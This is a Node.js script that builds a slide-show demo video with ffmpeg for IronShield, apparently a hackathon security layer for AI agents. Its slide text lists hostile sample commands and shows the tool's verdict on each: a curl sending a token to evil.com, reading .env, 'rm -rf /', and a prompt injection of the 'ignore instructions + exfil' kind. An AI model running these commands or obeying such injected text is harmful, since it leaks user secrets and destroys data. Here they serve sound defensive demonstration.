#!/usr/bin/env node
/**
 * Generates IronShield demo MP4 using ffmpeg drawtext slides.
 * Output: demo/ironshield-demo.mp4 (~3 min)
 */
import { execSync } from 'node:child_process';
import { mkdirSync, writeFileSync, rmSync, existsSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const __dir = dirname(fileURLToPath(import.meta.url));
const root = join(__dir, '..');
const outDir = join(root, 'demo');
const framesDir = join(outDir, 'frames');
const output = join(outDir, 'ironshield-demo.mp4');

const font = 'C\\\\:/Windows/Fonts/consola.ttf';

const slides = [
  { dur: 8, title: 'IronShield', sub: 'Zero-Trust Security Layer for IronClaw Agents' },
  { dur: 10, title: 'The Problem', sub: 'Agents leak secrets | destructive shell | prompt injection' },
  { dur: 12, title: 'Scenario 1: Secret Exfiltration', sub: 'curl evil.com?token=sk-live-xxx  ->  BLOCK 85/100' },
  { dur: 10, title: 'Scenario 2: Read .env', sub: 'cat .env  ->  REQUIRE_APPROVAL 45/100' },
  { dur: 10, title: 'Scenario 3: Legitimate API', sub: 'api.github.com  ->  ALLOW 0/100' },
  { dur: 12, title: 'Scenario 4: Prompt Injection', sub: 'ignore instructions + exfil  ->  BLOCK 100/100' },
  { dur: 10, title: 'Scenario 5: Scoped rm', sub: 'rm -rf /tmp/build  ->  REQUIRE_APPROVAL' },
  { dur: 10, title: 'Scenario 6: Root Wipe', sub: 'rm -rf /  ->  BLOCK 90/100' },
  { dur: 10, title: 'Audit Trail', sub: 'Redacted JSONL logs | Human approval workflow' },
  { dur: 12, title: 'Install', sub: 'skill/SKILL.md  ->  ~/.ironclaw/skills/ironshield/' },
  { dur: 10, title: 'github.com/jowy81/ironshield', sub: 'NEAR Legion IronClaw Hackathon 2026' },
];

function esc(text) {
  return text.replace(/\\/g, '\\\\').replace(/:/g, '\\:').replace(/'/g, "\\'");
}

function findFfmpeg() {
  try {
    execSync('ffmpeg -version', { stdio: 'pipe' });
    return 'ffmpeg';
  } catch {
    const local = 'C:\\ffmpeg\\bin\\ffmpeg.exe';
    if (existsSync(local)) return local;
    throw new Error('ffmpeg not found');
  }
}

function main() {
  rmSync(framesDir, { recursive: true, force: true });
  mkdirSync(framesDir, { recursive: true });
  mkdirSync(outDir, { recursive: true });

  const ffmpeg = findFfmpeg();
  const parts = [];

  slides.forEach((s, i) => {
    const part = join(framesDir, `part-${String(i).padStart(2, '0')}.mp4`);
    const title = esc(s.title);
    const sub = esc(s.sub);
    const vf = [
      `drawtext=fontfile=${font}:text='${title}':fontsize=56:fontcolor=0x58a6ff:x=(w-text_w)/2:y=h/3`,
      `drawtext=fontfile=${font}:text='${sub}':fontsize=32:fontcolor=0xc9d1d9:x=(w-text_w)/2:y=h/2`,
      `drawtext=fontfile=${font}:text='IronShield Demo':fontsize=24:fontcolor=0x8b949e:x=40:y=h-60`,
    ].join(',');

    execSync(
      `"${ffmpeg}" -y -f lavfi -i color=c=0x0d1117:s=1920x1080:d=${s.dur} -vf "${vf}" -c:v libx264 -pix_fmt yuv420p -r 30 "${part}"`,
      { stdio: 'inherit', shell: true }
    );
    parts.push(part);
  });

  const listFile = join(framesDir, 'concat.txt');
  writeFileSync(listFile, parts.map((p) => `file '${p.replace(/\\/g, '/')}'`).join('\n'));

  execSync(`"${ffmpeg}" -y -f concat -safe 0 -i "${listFile}" -c copy "${output}"`, {
    stdio: 'inherit',
    shell: true,
  });

  console.log(`\n✅ Demo video: ${output}`);
}

main();
